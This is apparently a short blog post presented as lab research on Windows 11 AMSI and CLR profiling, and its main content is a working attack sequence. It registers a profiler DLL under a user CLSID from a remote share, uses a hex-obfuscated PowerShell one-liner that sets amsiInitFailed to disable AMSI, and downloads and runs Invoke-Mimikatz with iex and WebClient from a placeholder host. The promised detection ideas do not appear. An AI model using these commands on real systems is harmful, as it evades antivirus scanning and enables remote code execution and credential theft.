# Windows 11 AMSI Research Using CLR Profiling 2026

## Description

Windows 11 AMSI and CLR profiling research in a lab environment. This blog shares simple observations about PowerShell, AMSI behavior, profiler DLL loading, and detection ideas from a non-admin user context.

---

## Lab Setup

- Windows 11 Enterprise Evaluation
- Version 25H2
- Active Directory environment
- Non-admin domain user
- PowerShell 5.x

---

## What is AMSI?

AMSI stands for Antimalware Scan Interface. It helps antivirus software scan PowerShell scripts before execution. This helps detect malicious scripts and suspicious commands.

---

## What is CLR Profiling?

CLR profiling is a .NET feature used for debugging and monitoring applications.
When profiling is enabled, the .NET runtime can load a profiler DLL into the process.
Since PowerShell uses .NET internally, PowerShell can also load profiler DLLs.

---

## Scripts Used During Testing in cmd
1.
set COR_ENABLE_PROFILING=1
   
2.
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
   
3.
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
   
4.
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
   
5.
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "\\hosted-server-ip-where-the-dll-save\Amsi\InShellProf.dll" /f
    
6.
powershell
    
7.
$typeStr = 'System.Management.Automation.' + -join ("41 6d 73 69 55 74 69 6c 73".Split(" ") | % { [char][Convert]::ToInt16($_, 16) })
$fieldStr = -join ("61 6d 73 69 49 6e 69 74 46 61 69 6c 65 64".Split(" ") | % { [char][Convert]::ToInt16($_, 16) })

$targetType = [Ref].Assembly.GetType($typeStr)
$targetField = $targetType.GetField($fieldStr, "NonPublic,`Static")
$targetField.SetValue($null, $true)

8.
iex ((New-Object Net.WebClient).DownloadString('http://hosted-server-ip-where-the-kiwi-save/Invoke-Mimikatz.ps1'))


---

## GitHub Resources
1. For InvisiShellProfiler.dll - https://github.com/OmerYa/Invisi-Shell/blob/master/build/x64/Release/InvisiShellProfiler.dll
2. For Kiwi - https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1






